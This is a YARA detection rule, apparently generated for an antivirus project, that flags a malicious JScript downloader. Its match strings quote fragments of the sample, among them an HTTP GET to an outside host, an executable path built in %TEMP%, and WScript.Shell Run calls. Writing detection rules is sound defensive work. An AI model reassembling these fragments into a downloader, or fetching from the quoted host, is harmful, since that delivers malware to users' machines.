rule sig_20160329_9ac7f53c9046c95b6c3d0e986e381e9b {
  meta:
    description = "datamaliciousorder - file 20160329_9ac7f53c9046c95b6c3d0e986e381e9b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6c3d4c1af3b53661a0f0767b6e6c82e084e1e9d50cda969a3ccbae464809e278"

  strings:
    $s1  = "Ke[ft](\"GET\", \"http://hiddenhandbags.com/kdk4a\", false);" fullword ascii
    $s2  = "function co() {return d[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"KuvzWnkhBuqBhHmU.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[L](Dq() * 11); if (Ke[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var d = function A() {return WScript[A0](\"WScript.Shell\");}(), XY = 11;" fullword ascii
    $s5  = "function V(C, jW){Kd = Kd * 1; return C - jW;};" fullword ascii
    $s6  = "function Ib(){return \"\" + Y0;};" fullword ascii
    $s7  = "function X(SX){d[\"Run\"](SX, Kd, Kd);};" fullword ascii
    $s8  = "function p() {return ((L0 == true) && (L0 == J0)) ? 1 : Kd;};" fullword ascii
    $s9  = "var y = new this[\"Date\"]();" fullword ascii
    $s10 = "function Dq(){return 22;};" fullword ascii
    $s11 = "function vU(){return A0;};" fullword ascii
    $s12 = "return V(gr, e);" fullword ascii
    $s13 = " while (r){" fullword ascii
    $s14 = "function kU(U) {var Rs = (1, 2, 3, 4, 5, U); return Rs;};" fullword ascii
    $s15 = "function Ku()" fullword ascii
    $s16 = "var J0 = false;" fullword ascii
    $s17 = "J0 = true; " fullword ascii
    $s18 = "L0 = true; " fullword ascii
    $s19 = "var L0 = false;" fullword ascii
    $s20 = "var t = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}